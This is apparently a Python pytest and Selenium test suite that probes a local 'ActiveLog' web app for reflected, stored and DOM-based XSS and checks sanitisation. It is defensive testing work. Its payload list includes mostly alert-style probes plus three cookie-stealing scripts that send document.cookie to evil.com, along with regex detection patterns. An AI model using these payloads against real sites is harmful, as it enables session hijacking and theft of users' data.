"""
Cross-Site Scripting (XSS) Prevention Tests for ActiveLog
Comprehensive test suite to detect and prevent XSS vulnerabilities.
"""

import pytest
import re
import html
import urllib.parse
import json
from typing import List, Dict, Any
from pathlib import Path
import bleach
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException


class XSSPayloadGenerator:
    """Generator for XSS attack payloads."""
    
    def __init__(self):
        # Comprehensive XSS payloads covering different attack vectors
        self.xss_payloads = [
            # Basic script injection
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>prompt('XSS')</script>",
            "<script>confirm('XSS')</script>",
            
            # JavaScript protocols
            "javascript:alert('XSS')",
            "javascript:prompt('XSS')",
            "javascript:confirm('XSS')",
            "javascript:void(0)",
            
            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<img src='x' onerror='alert(\"XSS\")'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # SVG-based XSS
            "<svg onload=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg/onload=alert('XSS')>",
            "<svg><animate onbegin=alert('XSS')></svg>",
            
            # HTML injection
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<form><button formaction=javascript:alert('XSS')>Click</button></form>",
            
            # CSS injection
            "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
            "<div style=\"background:url('javascript:alert(\"XSS\")')\">",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            
            # Attribute injection
            "\" onmouseover=\"alert('XSS')\"",
            "' onmouseover='alert(\"XSS\")'",
            "onclick=alert('XSS')",
            "onmouseover=alert('XSS')",
            
            # URL-based XSS
            "http://evil.com/?<script>alert('XSS')</script>",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            
            # Encoding variations
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            
            # Filter bypass techniques
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            "<script>eval('alert(\"XSS\")')</script>",
            "<script>Function('alert(\"XSS\")')();</script>",
            "<script>setTimeout('alert(\"XSS\")',1)</script>",
            "<script>setInterval('alert(\"XSS\")',1)</script>",
            
            # DOM-based XSS
            "<script>document.write('<img src=x onerror=alert(\"XSS\")');</script>",
            "<script>document.location='javascript:alert(\"XSS\")'</script>",
            "<script>window.location='javascript:alert(\"XSS\")'</script>",
            
            # Framework-specific payloads
            "{{constructor.constructor('alert(\"XSS\")')()}}",  # Angular
            "${alert('XSS')}",  # Template literals
            "#{alert('XSS')}",  # Ruby ERB
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert('XSS')>",
            "\"'><script>alert('XSS')</script>",
            "';alert('XSS');//",
            
            # Advanced payloads
            "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://evil.com/steal?cookie='+document.cookie);xhr.send();</script>",
            "<script>fetch('http://evil.com/steal', {method:'POST', body:document.cookie});</script>",
            "<script>new Image().src='http://evil.com/steal?'+document.cookie;</script>",
            
            # Context-specific payloads
            "';alert('XSS');//",  # JavaScript context
            "\");alert('XSS');//",  # JavaScript string context
            "</script><script>alert('XSS')</script>",  # Script tag context
            "<!--<script>alert('XSS')</script>-->",  # HTML comment context
        ]
        
        # Context-aware payloads for different injection points
        self.context_payloads = {
            'html_content': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            'html_attribute': [
                "\" onmouseover=\"alert('XSS')\"",
                "' onmouseover='alert('XSS')'",
                "javascript:alert('XSS')"
            ],
            'javascript_string': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "\\';alert('XSS');//"
            ],
            'css_context': [
                "expression(alert('XSS'))",
                "url('javascript:alert(\"XSS\")')",
                "/**/expression(alert('XSS'))"
            ],
            'url_parameter': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "%3Cscript%3Ealert('XSS')%3C/script%3E"
            ]
        }


class XSSDetector:
    """XSS vulnerability detector and analyzer."""
    
    def __init__(self):
        self.payload_generator = XSSPayloadGenerator()
        
        # XSS detection patterns
        self.xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
            r'<svg[^>]*>',
            r'expression\s*\(',
            r'eval\s*\(',
            r'setTimeout\s*\(',
            r'setInterval\s*\(',
            r'Function\s*\(',
            r'document\.write\s*\(',
            r'document\.location',
            r'window\.location'
        ]
        
        # Safe HTML tags and attributes (whitelist)
        self.safe_tags = [
            'p', 'br', 'strong', 'em', 'u', 'ol', 'ul', 'li',
            'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote',
            'code', 'pre', 'a', 'img'
        ]
        
        self.safe_attributes = {
            '*': ['class', 'id'],
            'a': ['href', 'title', 'target'],
            'img': ['src', 'alt', 'width', 'height', 'title']
        }
    
    def detect_xss_patterns(self, content: str) -> List[Dict[str, Any]]:
        """Detect XSS patterns in content."""
        findings = []
        
        for pattern in self.xss_patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                findings.append({
                    'pattern': pattern,
                    'match': match.group(),
                    'start': match.start(),
                    'end': match.end(),
                    'severity': self._assess_severity(match.group())
                })
        
        return findings
    
    def _assess_severity(self, match: str) -> str:
        """Assess severity of XSS pattern match."""
        match_lower = match.lower()
        
        if any(dangerous in match_lower for dangerous in ['script', 'javascript:', 'eval(', 'expression(']):
            return 'HIGH'
        elif any(medium in match_lower for medium in ['onload', 'onerror', 'onclick', 'iframe', 'object']):
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def sanitize_html(self, content: str, allow_safe_html: bool = False) -> str:
        """Sanitize HTML content to prevent XSS."""
        if not allow_safe_html:
            # Strip all HTML
            return html.escape(content)
        else:
            # Allow only safe HTML tags and attributes
            return bleach.clean(
                content,
                tags=self.safe_tags,
                attributes=self.safe_attributes,
                strip=True
            )
    
    def validate_url(self, url: str) -> Dict[str, Any]:
        """Validate URL for XSS attempts."""
        result = {
            'url': url,
            'safe': True,
            'issues': []
        }
        
        # Check for javascript: protocol
        if url.lower().startswith('javascript:'):
            result['safe'] = False
            result['issues'].append('JavaScript protocol detected')
        
        # Check for data: URLs with potential XSS
        if url.lower().startswith('data:'):
            if 'script' in url.lower() or 'javascript' in url.lower():
                result['safe'] = False
                result['issues'].append('Dangerous data URL detected')
        
        # Check for XSS patterns in URL
        xss_findings = self.detect_xss_patterns(url)
        if xss_findings:
            result['safe'] = False
            result['issues'].append(f'XSS patterns detected: {len(xss_findings)}')
        
        return result


class XSSTestSuite:
    """Comprehensive XSS testing suite."""
    
    def __init__(self, headless: bool = True):
        self.detector = XSSDetector()
        self.payload_generator = XSSPayloadGenerator()
        self.headless = headless
        self.driver = None
        
        # Test results storage
        self.test_results = {
            'total_tests': 0,
            'passed_tests': 0,
            'failed_tests': 0,
            'vulnerabilities_found': 0,
            'detailed_results': []
        }
    
    def setup_browser(self):
        """Setup Selenium WebDriver for DOM-based XSS testing."""
        try:
            chrome_options = Options()
            if self.headless:
                chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            return True
        except Exception as e:
            print(f"Failed to setup browser: {e}")
            return False
    
    def test_reflected_xss(self, url: str, parameters: Dict[str, str]) -> Dict[str, Any]:
        """Test for reflected XSS vulnerabilities."""
        results = {
            'url': url,
            'type': 'reflected',
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': [],
            'errors': []
        }
        
        if not self.driver:
            if not self.setup_browser():
                results['errors'].append('Failed to setup browser')
                return results
        
        for payload in self.payload_generator.xss_payloads[:20]:  # Test first 20 payloads
            results['payloads_tested'] += 1
            
            try:
                # Construct test URL with payload in parameters
                test_params = parameters.copy()
                for param_name in test_params:
                    test_params[param_name] = payload
                
                # Build query string
                query_params = urllib.parse.urlencode(test_params)
                test_url = f"{url}?{query_params}"
                
                # Load page
                self.driver.get(test_url)
                
                # Check if payload executed (look for alert dialogs)
                try:
                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    # Payload executed successfully
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'alert_text': alert_text,
                        'parameter': list(test_params.keys())[0]
                    })
                    
                except TimeoutException:
                    # No alert appeared - check page source for unescaped payload
                    page_source = self.driver.page_source
                    if payload in page_source and not html.escape(payload) in page_source:
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'type': 'source_injection',
                            'parameter': list(test_params.keys())[0]
                        })
                
            except Exception as e:
                results['errors'].append(f"Error testing payload '{payload}': {str(e)}")
        
        return results
    
    def test_stored_xss(self, submit_url: str, view_url: str, payload_data: Dict[str, str]) -> Dict[str, Any]:
        """Test for stored XSS vulnerabilities."""
        results = {
            'submit_url': submit_url,
            'view_url': view_url,
            'type': 'stored',
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': [],
            'errors': []
        }
        
        if not self.driver:
            if not self.setup_browser():
                results['errors'].append('Failed to setup browser')
                return results
        
        for payload in self.payload_generator.xss_payloads[:10]:  # Test first 10 payloads
            results['payloads_tested'] += 1
            
            try:
                # Step 1: Submit payload
                self.driver.get(submit_url)
                
                # Fill form fields with payload
                for field_name, field_value in payload_data.items():
                    try:
                        field = self.driver.find_element(By.NAME, field_name)
                        field.clear()
                        field.send_keys(payload)
                    except:
                        results['errors'].append(f"Field '{field_name}' not found")
                        continue
                
                # Submit form
                try:
                    submit_button = self.driver.find_element(By.XPATH, "//input[@type='submit'] | //button[@type='submit']")
                    submit_button.click()
                except:
                    results['errors'].append("Submit button not found")
                    continue
                
                # Step 2: View stored content
                self.driver.get(view_url)
                
                # Check if payload executed
                try:
                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'alert_text': alert_text,
                        'storage_successful': True
                    })
                    
                except TimeoutException:
                    # Check page source for unescaped payload
                    page_source = self.driver.page_source
                    if payload in page_source and not html.escape(payload) in page_source:
                        results['vulnerable'] = True
                        results['successful_payloads'].append({
                            'payload': payload,
                            'type': 'source_injection',
                            'storage_successful': True
                        })
                
            except Exception as e:
                results['errors'].append(f"Error testing stored payload '{payload}': {str(e)}")
        
        return results
    
    def test_dom_xss(self, url: str, dom_manipulation_script: str) -> Dict[str, Any]:
        """Test for DOM-based XSS vulnerabilities."""
        results = {
            'url': url,
            'type': 'dom',
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': [],
            'errors': []
        }
        
        if not self.driver:
            if not self.setup_browser():
                results['errors'].append('Failed to setup browser')
                return results
        
        for payload in self.payload_generator.xss_payloads[:15]:  # Test first 15 payloads
            results['payloads_tested'] += 1
            
            try:
                self.driver.get(url)
                
                # Execute DOM manipulation with payload
                script_with_payload = dom_manipulation_script.replace('{{PAYLOAD}}', payload)
                self.driver.execute_script(script_with_payload)
                
                # Check if payload executed
                try:
                    WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                    alert = self.driver.switch_to.alert
                    alert_text = alert.text
                    alert.accept()
                    
                    results['vulnerable'] = True
                    results['successful_payloads'].append({
                        'payload': payload,
                        'alert_text': alert_text,
                        'execution_context': 'dom'
                    })
                    
                except TimeoutException:
                    pass  # No alert appeared
                
            except Exception as e:
                results['errors'].append(f"Error testing DOM payload '{payload}': {str(e)}")
        
        return results
    
    def test_content_sanitization(self, content_samples: List[str]) -> Dict[str, Any]:
        """Test content sanitization effectiveness."""
        results = {
            'total_samples': len(content_samples),
            'properly_sanitized': 0,
            'improperly_sanitized': 0,
            'sanitization_results': []
        }
        
        for content in content_samples:
            # Test different sanitization methods
            html_escaped = html.escape(content)
            bleach_cleaned = self.detector.sanitize_html(content, allow_safe_html=True)
            
            # Check if XSS patterns remain after sanitization
            original_patterns = self.detector.detect_xss_patterns(content)
            escaped_patterns = self.detector.detect_xss_patterns(html_escaped)
            cleaned_patterns = self.detector.detect_xss_patterns(bleach_cleaned)
            
            sanitization_result = {
                'original_content': content,
                'html_escaped': html_escaped,
                'bleach_cleaned': bleach_cleaned,
                'original_xss_patterns': len(original_patterns),
                'escaped_xss_patterns': len(escaped_patterns),
                'cleaned_xss_patterns': len(cleaned_patterns),
                'properly_sanitized': len(escaped_patterns) == 0 and len(cleaned_patterns) == 0
            }
            
            if sanitization_result['properly_sanitized']:
                results['properly_sanitized'] += 1
            else:
                results['improperly_sanitized'] += 1
            
            results['sanitization_results'].append(sanitization_result)
        
        return results
    
    def run_comprehensive_test(self, test_config: Dict[str, Any]) -> Dict[str, Any]:
        """Run comprehensive XSS testing suite."""
        print("Starting comprehensive XSS testing...")
        
        comprehensive_results = {
            'test_config': test_config,
            'reflected_xss_tests': [],
            'stored_xss_tests': [],
            'dom_xss_tests': [],
            'sanitization_tests': {},
            'summary': {
                'total_vulnerabilities': 0,
                'critical_vulnerabilities': 0,
                'medium_vulnerabilities': 0,
                'low_vulnerabilities': 0
            }
        }
        
        # Test reflected XSS
        if 'reflected_xss_urls' in test_config:
            print("Testing reflected XSS...")
            for url_config in test_config['reflected_xss_urls']:
                result = self.test_reflected_xss(url_config['url'], url_config['parameters'])
                comprehensive_results['reflected_xss_tests'].append(result)
                
                if result['vulnerable']:
                    comprehensive_results['summary']['total_vulnerabilities'] += 1
                    comprehensive_results['summary']['critical_vulnerabilities'] += 1
        
        # Test stored XSS
        if 'stored_xss_urls' in test_config:
            print("Testing stored XSS...")
            for url_config in test_config['stored_xss_urls']:
                result = self.test_stored_xss(
                    url_config['submit_url'],
                    url_config['view_url'],
                    url_config['payload_data']
                )
                comprehensive_results['stored_xss_tests'].append(result)
                
                if result['vulnerable']:
                    comprehensive_results['summary']['total_vulnerabilities'] += 1
                    comprehensive_results['summary']['critical_vulnerabilities'] += 1
        
        # Test DOM XSS
        if 'dom_xss_tests' in test_config:
            print("Testing DOM-based XSS...")
            for dom_config in test_config['dom_xss_tests']:
                result = self.test_dom_xss(dom_config['url'], dom_config['script'])
                comprehensive_results['dom_xss_tests'].append(result)
                
                if result['vulnerable']:
                    comprehensive_results['summary']['total_vulnerabilities'] += 1
                    comprehensive_results['summary']['medium_vulnerabilities'] += 1
        
        # Test content sanitization
        if 'sanitization_tests' in test_config:
            print("Testing content sanitization...")
            sanitization_result = self.test_content_sanitization(test_config['sanitization_tests'])
            comprehensive_results['sanitization_tests'] = sanitization_result
            
            if sanitization_result['improperly_sanitized'] > 0:
                comprehensive_results['summary']['total_vulnerabilities'] += sanitization_result['improperly_sanitized']
                comprehensive_results['summary']['medium_vulnerabilities'] += sanitization_result['improperly_sanitized']
        
        return comprehensive_results
    
    def generate_report(self, test_results: Dict[str, Any]) -> str:
        """Generate comprehensive XSS test report."""
        report_lines = [
            "=" * 80,
            "XSS PREVENTION TEST REPORT",
            "=" * 80,
            f"Total Vulnerabilities Found: {test_results['summary']['total_vulnerabilities']}",
            f"Critical (Reflected/Stored XSS): {test_results['summary']['critical_vulnerabilities']}",
            f"Medium (DOM XSS/Sanitization): {test_results['summary']['medium_vulnerabilities']}",
            f"Low: {test_results['summary']['low_vulnerabilities']}",
            "",
            "REFLECTED XSS TESTS:",
        ]
        
        for test in test_results['reflected_xss_tests']:
            status = "VULNERABLE" if test['vulnerable'] else "SECURE"
            report_lines.append(f"  {test['url']} - {status}")
            if test['vulnerable']:
                report_lines.append(f"    Successful payloads: {len(test['successful_payloads'])}")
        
        report_lines.extend([
            "",
            "STORED XSS TESTS:",
        ])
        
        for test in test_results['stored_xss_tests']:
            status = "VULNERABLE" if test['vulnerable'] else "SECURE"
            report_lines.append(f"  {test['submit_url']} -> {test['view_url']} - {status}")
            if test['vulnerable']:
                report_lines.append(f"    Successful payloads: {len(test['successful_payloads'])}")
        
        report_lines.extend([
            "",
            "DOM XSS TESTS:",
        ])
        
        for test in test_results['dom_xss_tests']:
            status = "VULNERABLE" if test['vulnerable'] else "SECURE"
            report_lines.append(f"  {test['url']} - {status}")
            if test['vulnerable']:
                report_lines.append(f"    Successful payloads: {len(test['successful_payloads'])}")
        
        if 'sanitization_tests' in test_results:
            sanitization = test_results['sanitization_tests']
            report_lines.extend([
                "",
                "CONTENT SANITIZATION TESTS:",
                f"  Total samples tested: {sanitization['total_samples']}",
                f"  Properly sanitized: {sanitization['properly_sanitized']}",
                f"  Improperly sanitized: {sanitization['improperly_sanitized']}",
            ])
        
        report_lines.extend([
            "",
            "RECOMMENDATIONS:",
            "- Implement proper output encoding/escaping for all user input",
            "- Use Content Security Policy (CSP) headers",
            "- Validate and sanitize all input on both client and server side",
            "- Use framework-specific XSS protection mechanisms",
            "- Regular security testing and code review",
            "- Implement proper session management",
            "",
            "=" * 80
        ])
        
        return "\n".join(report_lines)
    
    def cleanup(self):
        """Cleanup resources."""
        if self.driver:
            self.driver.quit()


def test_activelog_xss_prevention():
    """Test XSS prevention specifically for ActiveLog application."""
    
    # ActiveLog XSS test configuration
    test_config = {
        'reflected_xss_urls': [
            {
                'url': 'http://localhost:3000/search',
                'parameters': {'q': 'test_value'}
            },
            {
                'url': 'http://localhost:3000/files',
                'parameters': {'filename': 'test_value', 'folder': 'test_value'}
            }
        ],
        'stored_xss_urls': [
            {
                'submit_url': 'http://localhost:3000/profile',
                'view_url': 'http://localhost:3000/profile',
                'payload_data': {'username': 'test', 'bio': 'test'}
            }
        ],
        'dom_xss_tests': [
            {
                'url': 'http://localhost:3000',
                'script': 'document.getElementById("content").innerHTML = "{{PAYLOAD}}";'
            }
        ],
        'sanitization_tests': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "' onmouseover='alert(\"XSS\")'",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
    }
    
    # Run tests
    xss_suite = XSSTestSuite(headless=True)
    
    try:
        results = xss_suite.run_comprehensive_test(test_config)
        report = xss_suite.generate_report(results)
        
        # Save report
        report_path = Path(__file__).parent.parent / "reports" / "xss_prevention_test_report.txt"
        report_path.parent.mkdir(exist_ok=True)
        
        with open(report_path, 'w') as f:
            f.write(report)
        
        print(report)
        print(f"\nDetailed report saved to: {report_path}")
        
        return results
        
    finally:
        xss_suite.cleanup()


# Pytest test cases
class TestXSSPrevention:
    """Pytest test cases for XSS prevention."""
    
    @pytest.fixture
    def xss_detector(self):
        """Create XSS detector instance."""
        return XSSDetector()
    
    def test_html_escape_prevents_xss(self, xss_detector):
        """Test that HTML escaping prevents XSS."""
        malicious_input = "<script>alert('XSS')</script>"
        escaped_output = html.escape(malicious_input)
        
        # Should not contain script tags after escaping
        assert "<script>" not in escaped_output
        assert "&lt;script&gt;" in escaped_output
    
    def test_bleach_sanitization(self, xss_detector):
        """Test Bleach HTML sanitization."""
        malicious_input = "<p>Safe content</p><script>alert('XSS')</script>"
        sanitized = xss_detector.sanitize_html(malicious_input, allow_safe_html=True)
        
        # Should keep safe tags but remove script
        assert "<p>Safe content</p>" in sanitized
        assert "<script>" not in sanitized
    
    def test_xss_pattern_detection(self, xss_detector):
        """Test XSS pattern detection."""
        test_cases = [
            ("<script>alert('XSS')</script>", True),
            ("javascript:alert('XSS')", True),
            ("<img src=x onerror=alert('XSS')>", True),
            ("Hello world", False),
            ("<p>Safe content</p>", False)
        ]
        
        for content, should_detect in test_cases:
            findings = xss_detector.detect_xss_patterns(content)
            assert (len(findings) > 0) == should_detect
    
    def test_url_validation(self, xss_detector):
        """Test URL validation for XSS."""
        test_urls = [
            ("https://example.com", True),
            ("javascript:alert('XSS')", False),
            ("data:text/html,<script>alert('XSS')</script>", False),
            ("http://example.com/normal-page", True)
        ]
        
        for url, should_be_safe in test_urls:
            result = xss_detector.validate_url(url)
            assert result['safe'] == should_be_safe
    
    @pytest.mark.parametrize("payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>"
    ])
    def test_common_xss_payloads_blocked(self, xss_detector, payload):
        """Test that common XSS payloads are detected and blocked."""
        # Test detection
        findings = xss_detector.detect_xss_patterns(payload)
        assert len(findings) > 0
        
        # Test sanitization
        sanitized = xss_detector.sanitize_html(payload)
        sanitized_findings = xss_detector.detect_xss_patterns(sanitized)
        assert len(sanitized_findings) == 0


def main():
    """Main function to run XSS prevention tests."""
    print("Starting XSS Prevention Tests for ActiveLog...")
    
    # Run manual testing
    detector = XSSDetector()
    
    # Test payload detection
    print("\nTesting XSS payload detection...")
    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "Normal text content"
    ]
    
    for payload in test_payloads:
        findings = detector.detect_xss_patterns(payload)
        status = f"DETECTED ({len(findings)} patterns)" if findings else "SAFE"
        print(f"  '{payload}' -> {status}")
    
    # Test sanitization
    print("\nTesting content sanitization...")
    for payload in test_payloads:
        sanitized = detector.sanitize_html(payload)
        print(f"  Original: {payload}")
        print(f"  Sanitized: {sanitized}")
        print()
    
    # Attempt to run browser-based tests (will fail if no browser available)
    print("\nAttempting browser-based XSS tests...")
    try:
        results = test_activelog_xss_prevention()
        print("Browser-based tests completed successfully!")
    except Exception as e:
        print(f"Browser-based tests failed (this is expected in headless environments): {e}")
        print("To run full browser tests, install Chrome/ChromeDriver and run in a GUI environment.")
    
    print("\nXSS prevention testing completed!")


if __name__ == "__main__":
    main()